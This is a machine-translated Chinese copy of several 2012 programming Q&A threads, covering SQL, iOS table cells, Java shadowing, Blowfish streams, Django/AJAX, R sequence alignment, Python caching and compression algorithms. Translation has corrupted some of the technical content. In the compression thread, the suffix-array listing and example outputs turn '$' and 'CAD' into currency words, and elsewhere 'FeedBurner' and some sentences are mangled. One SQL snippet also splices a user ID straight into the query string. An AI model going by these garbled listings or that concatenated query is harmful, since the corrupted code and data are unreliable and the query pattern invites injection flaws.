> 时间：2012-04-19T01:53:02.623

为什么不是这个？

```
SELECT COUNT(*) FROM post
WHERE postID NOT IN (
  SELECT taxiID FROM taxi 
  WHERE userID = '.$userID.' AND value = 0
)
LIMIT 10 
```

`order by`请注意，如果您只是在寻找计数，则无需执行 an 。另请注意，您有一个`limit`，因此结果不会超过 10 条记录。不确定这是否是这个想法。

# ios - 扩展 UITableViewCell

> ID：10220565
> 
> 赞同：19
> 
> 时间：2012-04-19T01:48:59.933
> 
> 标签：ios, xcode, uitableview

我正在尝试扩展 UITableViewCell 以显示更多内容。到目前为止，我已经完成了动画，但我的问题是新内容在动画完成之前出现。这是我的代码：

ps 在配置单元格时，描述标签和阅读按钮都以隐藏状态开始。

```
-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
    self.selectedRow = indexPath;
    SDJCell *cell = (SDJCell *)[tableView cellForRowAtIndexPath:indexPath];
    [tableView beginUpdates];
    [tableView endUpdates];
    cell.descriptionLabel.hidden = NO;
    cell.readButton.hidden = NO;
}

-(void)tableView:(UITableView *)tableView didDeselectRowAtIndexPath:(NSIndexPath *)indexPath {
    SDJCell *cell = (SDJCell *)[tableView cellForRowAtIndexPath:indexPath];
    [tableView beginUpdates];
    [tableView endUpdates];
    cell.descriptionLabel.hidden = YES;
    cell.readButton.hidden = YES;
}

- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath {
    if(selectedRow && indexPath.row == selectedRow.row) {
    return 100;
    }
    return 44;
} 
```

关于在单元格完成扩展后如何显示这些额外内容的任何想法？

谢谢！！

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-04-19T02:26:58.493

我有同样的问题。解决方案是设置单元格的自动调整大小掩码，以便它与超级视图一起调整大小。

```
cell.autoresizingMask = UIViewAutoresizingFlexibleHeight;
cell.clipsToBounds = YES; 
```

您也可以在 sotoryboard 中执行此操作，两个标志都可以在身份检查器下设置

# python - Python：检查命名服务是否正在运行

> ID：10220566
> 
> 赞同：-1
> 
> 时间：2012-04-19T01:49:00.567
> 
> 标签：python, network-programming, dns, named

有没有一种简单的方法来检查命名服务是否正在运行，并在 python 中正确运行？

干杯。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T08:13:42.500

我不知道您使用的是什么系统，但在 linux 中，如果您想检查名称服务是否正在运行，将使用 commnand

```
chkconfig --list  

acpid                     0:off  1:off  2:off  3:off  4:off  5:off  6:off
alsa-restore              0:off  1:off  2:off  3:off  4:off  5:off  6:off
alsa-store                0:off  1:off  2:off  3:off  4:off  5:off  6:off
anacron                   0:off  1:off  2:off  3:off  4:off  5:off  6:off
apache2                   0:off  1:off  2:on   3:on   4:on   5:on   6:off
apparmor                  0:off  1:off  2:off  3:off  4:off  5:off  6:off  S:on 
apport                    0:off  1:off  2:off  3:off  4:off  5:off  6:off
atd                       0:off  1:off  2:off  3:off  4:off  5:off  6:off
avahi-daemon              0:off  1:off  2:off  3:off  4:off  5:off  6:off
binfmt-support            0:off  1:off  2:off  3:off  4:off  5:off  6:off
bluetooth                 0:off  1:off  2:on   3:on   4:on   5:on   6:off
bootlogd                  0:off  1:off  2:off  3:off  4:off  5:off  6:off
brltty                    0:off  1:off  2:off  3:off  4:off  5:off  6:off  S:on 
console-setup             0:off  1:off  2:off  3:off  4:off  5:off  6:off
cron                      0:off  1:off  2:off  3:off  4:off  5:off  6:off
cups                      0:off  1:off  2:off  3:off  4:off  5:off  6:off
dbus                      0:off  1:off  2:off  3:off  4:off  5:off  6:off
dmesg                     0:off  1:off  2:off  3:off  4:off  5:off  6:off 
```

我认为 python 或 bashell 可以做到这一点。

# android - View 的 post() 方法的主要目的是什么

> ID：10220567
> 
> 赞同：2
> 
> 时间：2012-04-19T01:49:24.353
> 
> 标签：android

与 imageview、textview 等视图相关联的 post 方法的主要目的是什么？

```
new View(Context).post(runnable) 
```

一个例子将不胜感激:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T02:27:43.960

来自api文档：

> 使 Runnable 添加到消息队列中。runnable 将在用户界面线程上运行。仅当此视图附加到窗口时，才能从 UI 线程外部调用此方法。

它看起来像：如果你想在*另一个线程*中更新视图，你可以简单`post`的使用方法来更新视图。虽然 type 是`runnable`，但**它不能在单独的线程**中运行，它会像调用普通方法一样运行在 ui 线程中。

# java - Blowfish 代码应该是等价的，但不是

> ID：10220574
> 
> 赞同：1
> 
> 时间：2012-04-19T01:50:05.947
> 
> 标签：java, encryption, blowfish

我们有一个包装 BouncyCastle（实际上是 Android 的 SpongyCastle）Blowfish 的类来加密数据流：

```
public class BlowfishOutputStream extends OutputStream
{
    private final OutputStream os;
    private final PaddedBufferedBlockCipher bufferedCipher; 
```

我们的原始代码在一次操作中写入输出流之前加密了整个字节数组

```
public void write(byte[] raw, int offset, int length) throws IOException
{
    byte[] out = new byte[bufferedCipher.getOutputSize(length)];
    int result = this.bufferedCipher.processBytes(raw, 0, length, out, 0);
    if (result > 0)
    {
        this.os.write(out, 0, result);
    }
} 
```

当发送图像（即一次大量数据）时，它会导致两个副本同时保留在内存中。

下面的代码是等价的，但不是，我不知道为什么。我可以验证是否正在发送数据（总和`c2`等于`length`），但是在我们的服务器上接收到数据时，中间进程会在我们看到到达之前丢弃图像。在这个阶段我所知道的是，当使用初始代码时，会收到响应并且可以提取包含的图像，当使用替换代码时，会收到（并接受）响应但似乎没有提取图像。

```
public void write(byte[] raw, int offset, int length) throws IOException
{
    // write to the output stream as we encrypt, not all at once.
    final byte[] inBuffer = new byte[Constants.ByteBufferSize];
    final byte[] outBuffer = new byte[Constants.ByteBufferSize];
    ByteArrayInputStream bis = new ByteArrayInputStream(raw);
    // read into inBuffer, encrypt into outBuffer and write to output stream
    for (int len; (len = bis.read(inBuffer)) != -1;)
    {
        int c2 = this.bufferedCipher.processBytes(inBuffer, 0, len, outBuffer, 0);
        this.os.write(outBuffer, 0, c2);
    }
} 
```

**请注意**，问题**不是**由于缺少对 的调用`doFinal`，因为这是在流关闭时调用的。

```
public void close() throws IOException
{
    byte[] out = new byte[bufferedCipher.getOutputSize(0)];
    int result = this.bufferedCipher.doFinal(out, 0);
    if (result > 0)
    {
        this.os.write(out, 0, result);
    }
    *nb try/catch omitted*
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T03:14:52.537

确认，虽然具有讽刺意味的是，问题不在于图像，而在于以前的数据，但该数据正在写入完整的`raw`字节数组，而不仅仅是指定的范围。动态加密字节数组的等效代码是：

```
@Override
public void write(byte[] raw, int offset, int length) throws IOException
{
    // write to the stream as we encrypt, not all at once.
    final byte[] inBuffer = new byte[Constants.ByteBufferSize];
    final byte[] outBuffer = new byte[Constants.ByteBufferSize];
    int readStart = offset;
    // read into inBuffer, encrypt into outBuffer and write to output stream
    while(readStart<length)
    {
        int readAmount = Math.min(length-readStart, inBuffer.length);
        System.arraycopy(raw, readStart, inBuffer, 0, readAmount);
        readStart+=readAmount;
        int c2 = this.bufferedCipher.processBytes(inBuffer, 0, readAmount, outBuffer, 0);
        this.os.write(outBuffer, 0, c2);
    }
} 
```

# jquery - Django 和 ajax 代替 jquery popupdivs

> ID：10220577
> 
> 赞同：0
> 
> 时间：2012-04-19T01:50:20.867
> 
> 标签：jquery, ajax, django

我正在开发一个 django 食谱网站，其中一个页面目前正在使用隐藏的 div 进行设置，我相信它会大大降低网页速度。

让我进一步解释一下：

我有一个包含 6 个食谱的页面。这些配方中的每一个都是一个链接，当您单击该链接时，它会激活一个 jquery 函数，该函数将隐藏的 div 转换为一个 div，该 div 会在具有不透明黑色背景的内容容器上弹出内容。这样做的问题是所有 6 个 div 都隐藏在内容容器后面，我相信这会显着降低网站性能（特别是因为我还将加载评论，也许还有图片等）。

我想做的是仅在必要时使用 ajax 来获取信息，而不是加载所有内容。（包括评论和特定于食谱的所有信息）

也许我可以只有一个弹出 div 而不是 6 个弹出 div，并将相关的食谱内容加载到该 div 中。

我是 ajax 新手，想知道这将如何用 django 来实现。

这是模板：

```
<div id="recipe_cont">
    {% for recipe in recipe_list %}
    <div id="recipe">
        <div id="button{{ forloop.counter }}">  //creates 6 buttons because my page is paginated 6 objects to a page    
        <h4>{{ recipe.name }}</h4>
        <h5>{{ recipe.author }}</h5>
        <h5>Prep Time: {{ recipe.prep_time }} minutes</h5>
        </div>
                <h6><a href="/addrecipe/{{ recipe.id }}">Add Recipe</a>
            <a href="/removerecipe/{{ recipe.id }}">Remove Recipe</a></h6>

        <div id="popupContact{{ forloop.counter }}" class="popup">// this is the information I want to use ajax to retrieve and place into the popup div
                        <a id="popupContactClose{{ forloop.counter }}" style="cursor:pointer;float:right;">x</a>
                    <h1>{{ recipe.name }}
                    </h1>
                        <h3>{{ recipe.author }}</h3>
                        <p id="contactArea">
                        Ingredients: {{ recipe.ingredients }}
                        <br/><br/>
                        Steps: {{ recipe.steps }}
                        </p>
                     <br/><br/><br/><br/>
                        <br/>

                        {% get_comment_form for recipe as form %}
                        <table>
                    <form action="{% comment_form_target %}" method="post">
                        {% csrf_token %}
                        {{ form }}
                        <tr>
                        <td colspan="2">
                        <input type="submit" name="submit" value="Post" />
                        <input type="submit" name="preview" value="Preview" />
                        </td>
                        </tr>
                        </form>
                        </table>
                        {% for comment in comment_list %}
                        <a name="c{{ comment.id }}">comment</a>
                        {% endfor %}
            </div>
        <div id="backgroundPopup">
                </div>      
    </div>
{% endfor %}
</div> 
```

这是相关的 jquery 代码：这段代码只是为了演示弹出 div 的工作原理——不要认为你真的需要看这个

```
/***************************/
//@Author: Adrian "yEnS" Mato Gondelle
//@website: www.yensdesign.com
//@email: yensamg@gmail.com
//@license: Feel free to use it, but keep this credits please!                  
/***************************/

//SETTING UP OUR POPUP
//0 means disabled; 1 means enabled;
var popupStatus = 0;

//loading popup with jQuery magic!
function loadPopup($contact_selector){
    //loads popup only if it is disabled
    if(popupStatus==0){
        $("#backgroundPopup").css({
            "opacity": "0.7"
        }).fadeIn("slow");

        $contact_selector.fadeIn("fast");

        popupStatus = 1;
    }
}
//disabling popup with jQuery magic!
function disablePopup($contact_selector){
    //disables popup only if it is enabled
    if(popupStatus==1){
        $("#backgroundPopup").fadeOut("slow");
        $contact_selector.fadeOut("slow");
        popupStatus = 0;
    }
}

    //centering popup
    function centerPopup($contact_selector){
        //request data for centering
        var windowWidth = document.documentElement.clientWidth;
        var windowHeight = document.documentElement.clientHeight;
        var popupHeight = $("body").height();
        var popupWidth = $("body").width();
        //centering
        $contact_selector.css({
            "position": "absolute",
            "top": windowHeight/2-popupHeight/2,
            "left": windowWidth/2-popupWidth/2
        });
        //only need force for IE6

        $("#backgroundPopup").css({
            "height": windowHeight
        });

    }

    $(document).ready(function(){   
        //LOADING POPUP
        //Click the button event!
        $("#button1").click(function(){
            //centering with css
            centerPopup($('#popupContact1'));
            //load popup
            loadPopup($('#popupContact1'));
        });
        $("#button2").click(function(){
            //centering with css
            centerPopup($('#popupContact2'));
            //load popup
            loadPopup($('#popupContact2'));
        });
        $("#button3").click(function(){
            //centering with css
            centerPopup($('#popupContact3'));
            //load popup
            loadPopup($('#popupContact3'));
        });
        $("#button4").click(function(){
            //centering with css
            centerPopup($('#popupContact4'));
            //load popup
            loadPopup($('#popupContact4'));
        }); 
        $("#button5").click(function(){
            //centering with css
            centerPopup($('#popupContact5'));
            //load popup
            loadPopup($('#popupContact5'));
        });
        $("#button6").click(function(){
            //centering with css
            centerPopup($('#popupContact6'));
            //load popup
            loadPopup($('#popupContact6'));
        });                 
        //CLOSING POPUP
        //Click the x event!
        $("#popupContactClose1").click(function(){
        disablePopup($('#popupContact1'));
    });
        $("#popupContactClose2").click(function(){
        disablePopup($('#popupContact2'));
    });
        $("#popupContactClose3").click(function(){
        disablePopup($('#popupContact3'));
    });
        $("#popupContactClose4").click(function(){
        disablePopup($('#popupContact4'));
    });
        $("#popupContactClose5").click(function(){
        disablePopup($('#popupContact5'));
    });
        $("#popupContactClose6").click(function(){
        disablePopup($('#popupContact6'));
    });

    $("#backgroundPopup").click(function(){  
    disablePopup($('.popup'));  
    }); 

        //Press Escape event!
        $(document).keyup(function(e) {
        if( e.which == 27 ){
        disablePopup($('.popup'));

        }
    });
    }); 
```

最后是 css：这也有点无关紧要，但有助于展示 jquery 的工作原理

```
#backgroundPopup{  
display:none;  
position:fixed;  
_position:absolute; /* hack for internet explorer 6*/  
height:100%;  
width:100%;  
top:0;  
left:0;  
background:#000000;  
border:1px solid #cecece;  
z-index:1;  
}  
#popupContact1, #popupContact2, #popupContact3, #popupContact4, #popupContact5, #popupContact6{  
display:none;  
position:fixed;  
_position:absolute; /* hack for internet explorer 6*/  
height:400px;  
width:420px;  
background:#eee76f;  
border:2px solid black;  
z-index:2;  
padding:12px;  
font-size:13px;  
border-radius: 15px;
}  

.popup{
    overflow:auto;
}

.show_hide{
    float:left;
}
#popupContact1 h1, #popupContact2 h1, #popupContact3 h1, #popupContact4 h1, #popupContact5 h1, #popupContact6 h1{  
text-align:left;  
color:black;  
font-size:22px;  
font-weight:700;  
border-bottom:1px dotted black;  
padding-bottom:2px;  
margin-bottom:20px;  
}  
#popupContactClose1, #popupContactClose2, #popupContactClose3,#popupContactClose4,#popupContactClose5,#popupContactClose6{  
font-size:14px;  
line-height:14px;  
right:6px;  
top:4px;  
position:absolute;  
color:black;  
font-weight:700;  
display:block;  
cursor:pointer;
}  
#button6,#button5,#button4,#button3,#button2,#button1 {  
text-align:left;  
cursor:pointer;
width:150px;
} 
```

如果还有什么我应该包括的，请告诉我

谢谢你

零食鱼

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T04:50:19.650

jQuery中有完美的[ajax函数](http://api.jquery.com/category/ajax/)。对于您的情况，您可以使用类似

```
$('#recipe_cont').load('/recipe/123/ajax/') 
```

实际上，您应该为 ajax 和非 ajax 访问使用一个 URL，但将它们分开学习更容易。`/recipe/123/ajax/`将只返回页面的一部分，`<div id="recipe">...</div>`包括所有食谱内容。

而已。您还可以添加客户端缓存和其他内容，但基本上这样就足够了。

# web - 用于网站的 Google Blogger 新闻提要

> ID：10220579
> 
> 赞同：1
> 
> 时间：2012-04-19T01:50:54.493
> 
> 标签：web, blogs, blogger

我有一个网站和一个谷歌博客网站。我想在我的网站主页上添加一个部分，显示 3 或 4 个最近的博客文章（文章标题和文章的前 100-200 个字）。

是否有可以执行此操作的小部件或有关如何设置的任何建议？

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T19:06:10.573

我找到了一个非常有用的教程，它可以很容易地完成我想要的。输入帖子标题、条目的日期/时间以及帖子中的前 150 个字符。很容易设置。 [http://alt-web.blogspot.com/2011/06/adding-blogger-rss-feed-to-html-page.html](http://alt-web.blogspot.com/2011/06/adding-blogger-rss-feed-to-html-page.html) 谢谢！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:53:10.250

我建议编写一个简短的 PHP 脚本来打印 RSS 提要中的前 4 项...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-03-23T15:13:07.153

检查进料燃烧器。[https://feedburner.google.com/](https://feedburner.google.com/)

具体来说，查看 publicize 下的 BuzzBoost 选项。这允许您在 HTML 中嵌入 javascript，这将生成您最近几篇文章的 HTML。

# r - 将序列与缺失值对齐

> ID：10220580
> 
> 赞同：4
> 
> 时间：2012-04-19T01:51:01.367
> 
> 标签：r, sequence, alignment, missing-data, cross-correlation

我使用的语言是 R，但您不​​一定需要了解 R 来回答问题。

**问题：** 我有一个序列可以被认为是基本事实，另一个序列是第一个序列的移位版本，有一些缺失值。我想知道如何对齐两者。

**设置**

我有一个`ground.truth`基本上是一组时间的序列：

```
ground.truth <- rep( seq(1,by=4,length.out=10), 5 ) +
                rep( seq(0,length.out=5,by=4*10+30), each=10 ) 
```

想想`ground.truth`我正在执行以下操作的时间：

```
{take a sample every 4 seconds for 10 times, then wait 30 seconds} x 5 
```

我有第二个序列`observations`，它`ground.truth` *移动*了 20% 的值缺失：

```
nSamples <- length(ground.truth)
idx_to_keep <- sort(sample( 1:nSamples, .8*nSamples ))
theLag <- runif(1)*100
observations <- ground.truth[idx_to_keep] + theLag
nObs     <- length(observations) 
```

如果我绘制这些向量，这就是它的样子（请记住，将这些视为时间）：

![在此处输入图像描述](../Images/29294584863a3f9526f39c072b8c4612.png)

**我试过的。我想**：

*   计算班次（`theLag`在我上面的例子中）
*   计算一个向量`idx`，使得`ground.truth[idx] == observations - theLag`

首先，假设我们知道`theLag`。注意`ground.truth[1]`不一定`observations[1]-theLag`。事实上，我们有`ground.truth[1] == observations[1+lagI]-theLag`一些`lagI`.

为了计算这个，我想我会使用互相关（`ccf`函数）。

但是，每当我这样做时，我都会遇到最大的滞后。互相关为 0，意思是`ground.truth[1] == observations[1] - theLag`。但是我已经在示例中尝试过这个，我明确地*确保*它`observations[1] - theLag`不是（即修改以确保它没有 1）**。** `ground.truth[1]``idx_to_keep`

这种转变`theLag`不应该影响互相关（不是`ccf(x,y) == ccf(x,y-constant)`吗？）所以我打算稍后再解决。

不过，也许我误解了，因为`observations`它的价值不如`ground.truth`? 即使在我设置的更简单的情况下`theLag==0`，互相关函数仍然无法识别正确的滞后，这让我相信我正在考虑这个错误。

**有没有人有一个通用的方法来解决这个问题，或者知道一些可以提供帮助的 R 函数/包？**

非常感谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-19T03:17:32.343

对于滞后，您可以计算两组点之间的所有差异（距离）：

```
diffs <- outer(observations, ground.truth, '-') 
```

您的滞后应该是出现`length(observations)`次数的值：

```
which(table(diffs) == length(observations))
# 55.715382960625 
#              86 
```

再检查一遍：

```
theLag
# [1] 55.71538 
```

一旦你发现你的问题的第二部分很容易`theLag`：

```
idx <- which(ground.truth %in% (observations - theLag)) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-19T03:14:43.173

如果您的时间序列不太长，则以下内容应该有效。

您有两个时间戳向量，第二个是第一个的移位且不完整的副本，您想知道它移位了多少。

```
# Sample data
n <- 10
x <- cumsum(rexp(n,.1))
theLag <- rnorm(1)
y <- theLag + x[sort(sample(1:n, floor(.8*n)))] 
```

我们可以尝试所有可能的滞后，并通过将每个观察到的时间戳与最接近的“真实”时间戳相匹配，计算出对齐的糟糕程度。

```
# Loss function
library(sqldf)
f <- function(u) {
  # Put all the values in a data.frame
  d1 <- data.frame(g="truth",    value=x)
  d2 <- data.frame(g="observed", value=y+u)
  d <- rbind(d1,d2)
  # For each observed value, find the next truth value
  # (we could take the nearest, on either side, 
  # but it would be more complicated)
  d <- sqldf("
    SELECT A.g, A.value, 
           ( SELECT MIN(B.value) 
             FROM   d AS B 
             WHERE  B.g='truth' 
             AND    B.value >= A.value
           ) AS next
    FROM   d AS A
    WHERE  A.g = 'observed'
  ")
  # If u is greater than the lag, there are missing values.
  # If u is smaller, the differences decrease 
  # as we approach the lag.
  if(any(is.na(d))) {
    return(Inf)
  } else {
    return( sum(d$`next` - d$value, na.rm=TRUE) )
  }
} 
```

我们现在可以搜索最佳延迟。

```
# Look at the loss function
sapply( seq(-2,2,by=.1), f )

# Minimize the loss function.
# Change the interval if it does not converge, 
# i.e., if it seems in contradiction with the values above
# or if the minimum is Inf
(r <- optimize(f, c(-3,3)))
-r$minimum
theLag # Same value, most of the time 
```

# php - 使用 ssh2_exec 在 PHP 脚本中转义引号

> ID：10220587
> 
> 赞同：-1
> 
> 时间：2012-04-19T01:52:03.673
> 
> 标签：php, ssh, gnu-screen, libssh2

我需要一些帮助来转义这个脚本中的引号，我在上面和下面都有代码，但它与此无关，因为如果我只是发出一个 screen -d -m -S minecraft，它会创建一个很好的。任何帮助都会很棒，因为我已经尝试了一个小时，谢谢！

```
 if (!($stream = ssh2_exec($con, 'screen -d -m -S minecraft -p 0 -X stuff "\printf "\say This is a test.\r"\"\' ))) {
        echo "fail: unable to execute command\n";
    } else {
        // collect returning data from command
        stream_set_blocking($stream, true);
        $data = "";
        while ($buf = fread($stream,4096)) {
            $data .= $buf;
        }
        echo $data;
        fclose($stream);
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:53:06.197

不`\`应该在`"`. 此外，根据您的描述，听起来您只想运行“screen -d -m -S minecraft”，并且看起来您在那里有一个额外的 printf。

```
if (!($stream = ssh2_exec($con, "screen -d -m -S minecraft"))) 
```

[http://php.net/manual/en/language.types.string.php](http://php.net/manual/en/language.types.string.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:56:58.970

您只需更改`"\`为`\"`.

# java - 在java中运行时获取变量的默认值

> ID：10220588
> 
> 赞同：0
> 
> 时间：2012-04-19T01:52:23.343
> 
> 标签：java, variables, constructor

当我在 Eclipse 中运行这个程序时，我得到了变量的默认值，而不是我在运行时输入的值。当我运行程序时，我得到了在构造函数中分配的变量的默认值`public account()`，而不是我在运行时输入的那些值。有人可以解释发生这种情况的原因。

这是我的代码...

```
public class bank {
    public static void main(String[] args){
        account[] obj=new account[3]; 

        for(int i=0;i<3;i++){
            obj[i]=new account();
            obj[i].entry();
            obj[i].display();
        }

        for(int i=0;i<3;i++){
            obj[i]=new account();
            String res=obj[i].getCustomer_name();
            JOptionPane.showMessageDialog(null, res);
        }

        account obj=new account();
        obj.entry();
        obj.display();
    }

}

class account {
    private String customer_name;
    private int acc_num;
    private double open_balance;

    public account() {
        customer_name="ADAM";
        acc_num=001;
        open_balance=100;
    }

    public void entry() {
        String customer_name=JOptionPane.showInputDialog(null, "Enter the customer name");
        String acc_num=JOptionPane.showInputDialog(null, "Enterthe account number");
        String open_balance=JOptionPane.showInputDialog(null, "Enter the balance");

        int acc_num1=Integer.parseInt(acc_num);
        double open_balance1=Double.parseDouble(open_balance);
    }

    public void display() {
        JOptionPane.showMessageDialog(null,customer_name);
    }

    public String getCustomer_name() {
        return customer_name;
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T01:58:30.547

问题是阴影：当您在方法中声明与成员变量同名的变量时，它会隐藏成员变量。

例如

```
class MyClass{
    int var = 12;

    void shadows(){
        int var = 5;
        System.out.println(var); // prints 5
        System.out.println(this.var); // prints 12
    }

    void noshadows(){
        System.out.println(var); // prints 12
    }
} 
```

你的修复：

```
public void entry()
{
    customer_name=JOptionPane.showInputDialog(null, "Enter the customer name");
    String acc_num_str=JOptionPane.showInputDialog(null, "Enterthe account number");

    String open_balance_str=JOptionPane.showInputDialog(null, "Enter the balance");

    acc_num=Integer.parseInt(acc_num_str);

    open_balance=Double.parseDouble(open_balance_str);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:00:36.537

我不是 Java 专家，所以这可能只是猜测，但这里的代码看起来不正确：

```
public account()
{
    customer_name="ADAM";
    acc_num=001;
    open_balance=100;
}

public void entry()
{
    String customer_name=JOptionPane.showInputDialog(null, "Enter the customer name");
    String acc_num=JOptionPane.showInputDialog(null, "Enterthe account number");

    String open_balance=JOptionPane.showInputDialog(null, "Enter the balance");

    int acc_num1=Integer.parseInt(acc_num);

    double open_balance1=Double.parseDouble(open_balance);

} 
```

在`entry()`方法中，您要重新声明`customer_name`、`acc_num`和`open_balance`变量。因此，当您在该方法中引用它们时，您引用的是新创建的局部变量，而不是类级变量。

我对它甚至编译感到惊讶，但我想这只是展示了我对 Java 的不了解。根本没有编译器警告吗？

# python - 如何为函数缓存散列 *args **kwargs？

> ID：10220599
> 
> 赞同：23
> 
> 时间：2012-04-19T01:53:18.440
> 
> 标签：python

我正在使用`xlwt`它对在 excel 文档中可以定义多少样式有 4k 限制。

通常，人们会创建如下样式：

```
style = xlwt.easyxf("font: bold 1") 
```

我简单地替换为

```
def cached_easyxf(self, format):
    return self._cache.setdefault(format, xlwt.easyxf(format)) 
```

效果很好。现在，我发现有时我需要传入关键字参数，这让我开始思考：我应该如何散列 args/kwargs 签名？

我应该根据 str(value) 创建一个缓存键吗？泡菜？什么是最坚固的？

对于我的情况，看起来我可以将键/值转换为字符串并将其添加到我的键中......但我现在很好奇一种通用的方法来处理这个问题，比如不可散列的类型`arg=[1, 2, 3]`

```
def cached_call(*args, **kwargs):
    return cache.get(what_here)
cached_call('hello')
cached_call([1, 2, 3], {'1': True}) 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-04-19T02:37:25.657

这是 functools.lru_cache() 中使用的技术：

```
kwd_mark = object()     # sentinel for separating args from kwargs

def cached_call(*args, **kwargs):
    key = args + (kwd_mark,) + tuple(sorted(kwargs.items()))
    return cache.get(key) 
```

请注意，上面的代码处理关键字参数，但没有尝试处理非散列值（如列表）。*您使用列表str*的想法是一个合理的开始。对于*集合*对象，您需要先对条目进行排序，`str(sorted(someset))`. 其他对象可能没有有用的 __repr__ 或 __str__ （即它们可能只显示对象类型和内存中的位置）。总之，处理任意不可散列的参数需要仔细考虑每种对象类型。

# algorithm - 基于重复、基于模式的数据压缩算法

> ID：10220602
> 
> 赞同：0
> 
> 时间：2012-04-19T01:53:34.430
> 
> 标签：algorithm, data-compression

假设我有以下字符串：

```
ABCADCADCADABC 
```

我想通过查找重复的子字符串来压缩它。什么是提供最佳压缩的算法？

在上面的例子中它应该返回

```
AB*1 CAD*3 ABC*1 
```

为了比较，贪心算法可能会返回

```
ABC*1 ADC*2 AD*1 ABC*1 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T02:12:25.450

Depending on whether you prefer fast and simple or high compression ratio you could take a look into the [Lempel-Ziv-Welch (LZW)](http://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Welch) or [Lempel-Ziv-Markov chain (LZMA)](http://en.wikipedia.org/wiki/Lempel-Ziv-Markov_chain_algorithm) algorithms. They both keep dictionaries of recurring strings.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-19T07:05:31.087

这听起来像是后缀数组/树的工作！

[http://en.wikipedia.org/wiki/Suffix_array](http://en.wikipedia.org/wiki/Suffix_array)

您可以使用在字符串上构建的后缀数组来找出重复的模式。例如，我们可以在您的示例上构建一个后缀数组，如下所示（我总是在每个字母之后使用 $，您可以对其进行排序，以便 $ 在每个字母之前......无论哪种方式都可以）：

```
ABCADCADCADABC$
美元
ADABC$
ADCADABC$
ADCADCADABC$
BCADCADCADABC$
元
加元ABC$
CADCADABC$
CADCADCADABC$
加元
DABC$
DCADABC$
DCADCADABC$
$

```

由此，我们可以更容易地看出字符串中的常见模式。使用此后缀数组表示中的信息，我们可以看到 CAD 在局部区域中重复了 3 次，我们可能会将其用作我们的压缩选择。ADC 和 DCA 等没有那么吸引人，因为它们压缩的字符串较少。

[http://en.wikipedia.org/wiki/Suffix_tree](http://en.wikipedia.org/wiki/Suffix_tree)

后缀树是执行相同任务的更有效方法。一旦你了解了如何使用后缀数组来做某事，那么进入后缀树就不会太远了。事实上，这用于流行的压缩算法，包括 LZW [1](http://en.wikipedia.org/wiki/LZW)和 BWT (Bzip) [2](http://en.wikipedia.org/wiki/Burrows%E2%80%93Wheeler_transform)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-19T03:57:37.943

它可能实际上并不相关，但是对于您提出的特定问题，有一个动态编程解决方案。如果您已经计算了从第一个字符开始压缩长度为 1、2、3...n-1 的字符串的最佳方法，那么您可以计算从第一个字符开始压缩长度为 n 的字符串的最佳方法：查看每个可能性 k 的最后 k 个字符，并查看它们是否形成简单字符串的倍数。如果是这样，计算压缩前 nk 个字符然后使用字符串的倍数表示最后 k 个字符的成本。

因此，在您的示例中，您最后会注意到 ABC 是其自身的倍数，并且如果您将其表示为 ABC*1，您可以使用您已经为 AB CAD*3 的前 11 个字符计算出的答案来生成AB*1 加元*3 ABC*1

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-19T02:45:11.540

更好的是：

```
ABCAD(6,3)(3,11) 
```

其中 (n,d) 是匹配的长度和距离。所以 (6,3) 从三个字节开始复制六个字节。虽然这听起来有点奇怪，但当它输入三个字节时，它需要的下三个字节已经被复制了。所以`CADCAD`附加。`ABC`附加的 (3,11) 原因。

这称为 LZ77 压缩。它是 zip、gzip 和 zlib 使用 deflate 压缩数据格式实现的。该格式不仅引用了以前的字符串匹配，而且还对文字（例如`ABCAD`）以及长度和距离使用了霍夫曼压缩。

# c++ - 良好实践，包括源文件

> ID：10220606
> 
> 赞同：0
> 
> 时间：2012-04-19T01:54:11.670
> 
> 标签：c++, boost, include

我正在使用 boost msm 库（您不需要知道它是如何工作的）来编码我的状态机，并且我有一个 cpp 源文件组织问题。

在第一个源文件（1.cpp）中，我定义了状态机、事件和动作以及转换表，但我想在另一个 cpp 文件中定义状态，只是因为我需要更频繁地编辑状态状态机中的任何其他内容。

现在我所做的是我在另一个源文件（2.cpp）中写了状态，我在 1.cpp 中包含了 2.cpp

它编译和一切，但它根本不干净，我想以某种方式封装这个......有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T02:15:34.293

通常，您只会包含 .h 文件，即声明类型的头文件以及您将在关联的 .cpp 文件中实现的函数。您根本不需要包含实现文件。您是否创建了任何头文件？这是一个基本示例：

```
// Foo.h
class Foo {
    // note that it is not defined here, only declared
    public void some_function(int i);
};

// Foo.cpp
#include "Foo.h"
#include <iostream>

// implement the function here
void Foo::some_func(int i) {
    std::cout << i;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T02:17:03.907

通常在 C++ 中，类的定义和函数原型存在于*头文件*中（以 .h 或 .hpp 结尾），而函数的实现存在于*源文件*中（以 .cpp 或 .cxx 结尾）。这允许您公开一个外部接口，以便其他文件可以使用第一个文件中使用的定义。您将在头文件中制作函数原型和类声明，然后将该头文件包含在两个 cpp 文件中。
